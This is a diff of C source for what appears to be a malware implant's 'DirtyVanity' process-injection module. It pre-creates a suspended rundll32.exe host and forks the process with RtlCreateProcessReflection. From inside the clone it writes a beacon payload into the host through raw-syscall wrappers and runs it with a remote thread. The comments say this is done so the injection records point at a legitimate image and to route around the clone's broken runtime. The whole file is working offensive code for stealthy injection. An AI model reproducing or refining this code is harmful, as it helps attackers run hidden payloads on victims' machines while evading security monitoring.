@@ -261,72 +261,65 @@ typedef NTSTATUS(NTAPI *fRtlCreateProcessReflection)(void *, unsigned long, void
  * remote threads, no inherited-runtime poisoning, identical image. */
 typedef struct {
 	volatile LONG go;
+	void * host;      /* suspended host pre-created by the healthy parent;
+	                   * the INHERIT_HANDLES fork copies the handle table
+	                   * 1:1, so the same VALUE works inside the clone */
 	char * payload;   /* dll bytes already mirrored into the clone (RX) */
 	int    plen;
 	void * param;     /* parameter blob already mirrored (RW) */
 	int    plen_arg;
 } DV_MAILBOX;
 
-static DV_MAILBOX dv_mailbox = { 0, NULL, NULL };
+static DV_MAILBOX dv_mailbox = { 0, NULL, NULL, 0, NULL, 0 };
 static HANDLE dv_clone_handle = NULL;
 static DWORD  dv_clone_pid = 0;
 
-/* runs INSIDE the clone. kernel32 only - the cloned runtime's state is
- * a torn snapshot (heap locks, RPC bindings mid-flight); a full beacon
- * payload dies here in RPCRT4 on its first RPC touch (live, twice). The
- * public PoC's shellcode spawns a child for exactly this reason: the
- * clone acts as the LAUNCHER - fresh suspended host, mirror the payload,
- * CreateRemoteThread. The new session comes from the healthy host while
- * every process/thread record inside the clone points at our own
- * legitimate image. */
-static void dv_clone_launch(char * payload, int plen, void * param, int plen_arg) {
-	STARTUPINFOA        si;
-	PROCESS_INFORMATION pi;
-	void *              remote = NULL;
-	void *              rparam = NULL;
-	SIZE_T              got = 0;
-	DWORD               oldp = 0;
+/* runs INSIDE the clone. The cloned user-mode runtime is a torn snapshot
+ * (heap locks, FLS, RPC bindings mid-flight): a full beacon payload dies
+ * in RPCRT4 on its first RPC touch and even CreateProcessA faults in
+ * KERNELBASE (both observed live). The launch therefore touches NOTHING
+ * user-mode: the host process was pre-created by the healthy PARENT at
+ * boot, its handle inherited through the fork, and every operation here
+ * routes through the raw-syscall gate wrappers (stubs resolved in the
+ * parent and inherited with the address space; the profile's syscall
+ * method selects them). The new session comes from the healthy host
+ * while every injection record inside the clone points at our own
+ * legitimate image - the DirtyVanity contract. */
+static void dv_clone_launch(void * host, char * payload, int plen, void * param, int plen_arg) {
+	void * remote;
+	void * rparam = NULL;
+	SIZE_T got = 0;
+	DWORD  oldp = 0;
+	HANDLE ht;
 
-	ZeroMemory(&si, sizeof(si));
-	si.cb = sizeof(si);
-	ZeroMemory(&pi, sizeof(pi));
-
-	if (!CreateProcessA(NULL, (LPSTR)"rundll32.exe", NULL, NULL, FALSE,
-	                    CREATE_SUSPENDED, NULL, NULL, &si, &pi))
+	if (host == NULL)
 		return;
 
-	remote = VirtualAllocEx(pi.hProcess, NULL, (SIZE_T)plen,
-	                        MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);
-	if (remote == NULL || !WriteProcessMemory(pi.hProcess, remote, payload, (SIZE_T)plen, &got) || got != (SIZE_T)plen)
-		goto done;
-	VirtualProtectEx(pi.hProcess, remote, (SIZE_T)plen, PAGE_EXECUTE_READ, &oldp);
+	remote = beacon_VirtualAllocEx(host, NULL, (SIZE_T)plen,
+	                               MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);
+	if (remote == NULL)
+		return;
+	if (!beacon_WriteProcessMemory(host, remote, payload, (SIZE_T)plen, &got) || got != (SIZE_T)plen)
+		return;
+	beacon_VirtualProtectEx(host, remote, (SIZE_T)plen, PAGE_EXECUTE_READ, &oldp);
 
 	if (plen_arg > 0) {
-		rparam = VirtualAllocEx(pi.hProcess, NULL, (SIZE_T)plen_arg,
-		                        MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);
+		rparam = beacon_VirtualAllocEx(host, NULL, (SIZE_T)plen_arg,
+		                               MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);
 		if (rparam != NULL)
-			WriteProcessMemory(pi.hProcess, rparam, param, (SIZE_T)plen_arg, &got);
+			beacon_WriteProcessMemory(host, rparam, param, (SIZE_T)plen_arg, &got);
 	}
 
-	{
-		HANDLE ht = CreateRemoteThread(pi.hProcess, NULL, 0,
-		                               (LPTHREAD_START_ROUTINE)remote, rparam, 0, NULL);
-		if (ht != NULL)
-			CloseHandle(ht);
-	}
-
-done:
-	/* the host's never-started main thread stays suspended; the injected
-	 * beacon owns the process from here */
-	CloseHandle(pi.hProcess);
-	CloseHandle(pi.hThread);
+	ht = beacon_CreateRemoteThread(host, NULL, 0, (LPTHREAD_START_ROUTINE)remote, rparam, 0, NULL);
+	if (ht != NULL)
+		CloseHandle(ht); /* kernel32 close: syscall-thin, no runtime state */
 }
 
 void dv_nursery_trampoline(void * unused) {
 	(void)unused;
 	while (!dv_mailbox.go)
 		Sleep(200);
-	dv_clone_launch(dv_mailbox.payload, dv_mailbox.plen,
+	dv_clone_launch(dv_mailbox.host, dv_mailbox.payload, dv_mailbox.plen,
 	                dv_mailbox.param, dv_mailbox.plen_arg);
 	for (;;)
 		Sleep(60000);
@@ -349,6 +342,30 @@ void dv_nursery_init(void) {
 	pReflect = (fRtlCreateProcessReflection)GetProcAddress(nt, "RtlCreateProcessReflection");
 	if (pReflect == NULL)
 		return;
+
+	/* pre-create the suspended launch host NOW, from the healthy parent:
+	 * the clone's torn runtime cannot even CreateProcessA (live: AV in
+	 * KERNELBASE), so the host must exist before the fork - its handle
+	 * rides into the clone through INHERIT_HANDLES (copied 1:1) */
+	{
+		STARTUPINFOA        si;
+		PROCESS_INFORMATION pi;
+		ZeroMemory(&si, sizeof(si));
+		si.cb = sizeof(si);
+		ZeroMemory(&pi, sizeof(pi));
+		if (!CreateProcessA(NULL, (LPSTR)"rundll32.exe", NULL, NULL, FALSE,
+		                    CREATE_SUSPENDED, NULL, NULL, &si, &pi)) {
+			spawn_log("dv: host pre-create failed gle=", (long)GetLastError());
+			return;
+		}
+		dv_mailbox.host = pi.hProcess;
+		/* pi.hThread stays suspended forever - the injected beacon owns
+		 * the host; keep the handle to avoid cleanup complexity */
+	}
+
+	/* the raw-syscall stubs must be resolved in the healthy parent so the
+	 * inherited copies are ready inside the clone */
+	syscalls_resolve();
 
 	/* flags: INHERIT_HANDLES | NO_SUSPEND (live matrix; see the flag notes
 	 * in git history - every NO_SYNCHRONIZE combo is rejected here) */
